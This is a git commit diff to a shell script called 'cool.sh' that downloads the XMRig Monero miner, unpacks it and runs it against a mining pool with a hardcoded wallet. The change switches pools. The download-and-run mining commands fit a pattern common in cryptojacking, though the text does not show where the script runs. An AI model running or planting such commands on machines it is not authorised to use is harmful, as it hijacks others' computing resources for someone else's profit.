0eecbedfc9cfb1bca1800ac63ca734d0e76a004c
MCKingSam <55560187+MCKingSam@users.noreply.github.com>
2022-08-14 21:44:38 +0100

    Update cool.sh

--- cool.sh
+++ cool.sh
@@ -3,4 +3,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux
 tar -xvzf xmrig-6.12.1-linux-x64.tar.gz
 cd xmrig-6.12.1
 chmod u+x ./xmrig
-./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 41wkbeDzzVrcXH2Vo9fn8ZhVrW4dHnZd3CHzK3Dmons7hViwLgk8U1tPW2DyNrLaKKep65gyey6QtC3f8r6yxL9qPeYmPTB -p x -k
+./xmrig --coin=XMR -o gulf.moneroocean.stream:10128 -u 41wkbeDzzVrcXH2Vo9fn8ZhVrW4dHnZd3CHzK3Dmons7hViwLgk8U1tPW2DyNrLaKKep65gyey6QtC3f8r6yxL9qPeYmPTB -p x -k
